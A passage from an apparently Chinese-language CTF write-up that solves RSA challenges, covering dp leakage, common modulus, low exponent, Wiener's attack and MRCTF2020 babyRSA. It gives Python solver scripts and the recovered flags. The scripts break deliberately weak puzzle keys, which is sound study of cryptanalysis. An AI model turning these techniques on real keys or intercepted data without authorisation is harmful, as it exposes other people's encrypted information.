734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写个小脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span>c <span class="token operator">=</span> <span class="token number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span>dp <span class="token operator">=</span> <span class="token number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span><span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            y <span class="token operator">=</span> n <span class="token operator">%</span> x            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                p <span class="token operator">=</span> x                <span class="token keyword">break</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi    <span class="token keyword">return</span> dd <span class="token operator">=</span> getd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="ctfshow、easyrsa3"><a href="#ctfshow、easyrsa3" class="headerlink" title="ctfshow、easyrsa3"></a>ctfshow、easyrsa3</h4><p><strong>TAG: 共模攻击</strong></p><p>给出数据</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 797n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930e &#x3D; 521n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>n相同，判定所需的攻击方式为共模攻击</p><p>用我特制的脚本拿到了flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;sh4r3_N&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h3><h4 id="ctfshow、easyrsa4"><a href="#ctfshow、easyrsa4" class="headerlink" title="ctfshow、easyrsa4"></a>ctfshow、easyrsa4</h4><p>给出数据为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 3n &#x3D; 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761c &#x3D; 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>符合低加密指数攻击的一般特性，加密指数指的就是加密过程中所使用的参数<em>e</em>，低加密指数说的就是这个参数很小的时候(一般等于2或3)，可以直接对这个加密后的内容c进行开方来解密。写脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">3</span>n <span class="token operator">=</span> <span class="token number">18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span>c <span class="token operator">=</span> <span class="token number">150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span>tmp <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 防止c已经被模n过了</span>    <span class="token keyword">if</span> tmp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        c <span class="token operator">+=</span> nflag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="e很大时-Winner’s-attack"><a href="#e很大时-Winner’s-attack" class="headerlink" title="e很大时(Winner’s attack)"></a>e很大时(Winner’s attack)</h3><h4 id="ctfshow、easyrsa5"><a href="#ctfshow、easyrsa5" class="headerlink" title="ctfshow、easyrsa5"></a>ctfshow、easyrsa5</h4><p>当e很大、d很小时采用winner’s attack攻击。先看看给出的数据</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345n &#x3D; 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231c &#x3D; 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>三个参数很接近的时候，采用维纳攻击，我对维纳攻击的脚本编写的原理不是特别清楚，这里我只是一个脚本小子，直接<code>pip3 install owiener</code>下载维纳攻击的工具即可，编写脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> owienere <span class="token operator">=</span> <span class="token number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span>n <span class="token operator">=</span> <span class="token number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span>c <span class="token operator">=</span> <span class="token number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span>d <span class="token operator">=</span> owiener<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;very_biiiiig_e&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="已知p高位攻击"><a href="#已知p高位攻击" class="headerlink" title="已知p高位攻击"></a>已知p高位攻击</h3><h4 id="ctfshow、easyrsa7"><a href="#ctfshow、easyrsa7" class="headerlink" title="ctfshow、easyrsa7"></a>ctfshow、easyrsa7</h4><p>给出的条件为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 0x10001p&gt;&gt;128&lt;&lt;128 &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3c &#x3D; 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>给出了p的高位，这时候可以利用Coppersmith攻击来恢复p，这个我现在也不是特别了解原理，明天再看看。</p><h3 id="复杂的RSA"><a href="#复杂的RSA" class="headerlink" title="复杂的RSA"></a>复杂的RSA</h3><blockquote><p>​    这里把下面的所有的RSA的题目全部归类为复杂的rsa题目，既能归为复杂，必然是用到的不仅仅是rsa的知识，或者就是有多重加密的嵌套，但是起主要作用的还是rsa亦可归为此类之中。</p><p>​    现在的比赛的题目大多数都是这种了，就是给你一个用来加密的脚本，让你自己找加密中的脆弱的地方，从而实现破解。</p></blockquote><h4 id="MRCTF2020-babyRSA"><a href="#MRCTF2020-babyRSA" class="headerlink" title="[MRCTF2020]babyRSA"></a>[MRCTF2020]babyRSA</h4><p>给出的加密的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> random<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;xxxx&#125;"</span>base <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">GCD</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>    B <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        B <span class="token operator">=</span> gcd<span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> B<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_p :"</span><span class="token punctuation">,</span> P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    factor <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_factor :"</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sub_Q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q_1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q_2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    Q <span class="token operator">=</span> sub_Q <span class="token operator">**</span> Q_2 <span class="token operator">%</span> Q_1    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_1: "</span><span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_2: "</span><span class="token punctuation">,</span> Q_2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sub_Q: "</span><span class="token punctuation">,</span> sub_Q<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    _E <span class="token operator">=</span> base    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''P_p : 206027926847308612719677572554991143421P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    注意到上面的加密过程给出的q相关的数据比较多，解q也比较简单，直接求一下<code>Q = sub_Q ** Q_2 % Q_1</code>然后求一下<code>sympy.nextprime(Q)</code>即可。</p><p>​    再看p，p是直接<code>p = getPrime(1024)</code>获取的，但是给出了加密后的m<code>factor = pow(p, base, n)</code>，只要求出来n与d即可，前面给出的<code>P_p</code>提示即可求出来所有的元素，从而可以获得p。</p><p>​    编写解密脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesbase <span class="token operator">=</span> <span class="token number">65537</span>P_p <span class="token operator">=</span> <span class="token number">206027926847308612719677572554991143421</span>P_factor <span class="token operator">=</span> <span class="token number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span>Q_1 <span class="token operator">=</span> <span class="token number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span>Q_2 <span class="token operator">=</span> <span class="token number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span>sub_Q <span class="token operator">=</span> <span class="token number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span>Ciphertext <span class="token operator">=</span>  <span class="token number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span><span class="token comment"># 求q</span>Q <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>sub_Q<span class="token punctuation">,</span> Q_2<span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span> <span class="token comment"># sub_Q ** Q_2 % Q_1</span>q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token comment"># 求p</span>P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> P_p<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>prevprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span><span class="token number">9</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># prevprime是求当前素数的前面一个素数的函数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>_n <span class="token operator">=</span> <span class="token number">1</span>_phi <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    _n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    _phi <span class="token operator">*=</span> <span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>_d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> _phi<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>P_factor<span class="token punctuation">,</span> _d<span class="token punctuation">,</span> _n<span class="token punctuation">)</span>p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 解密</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span 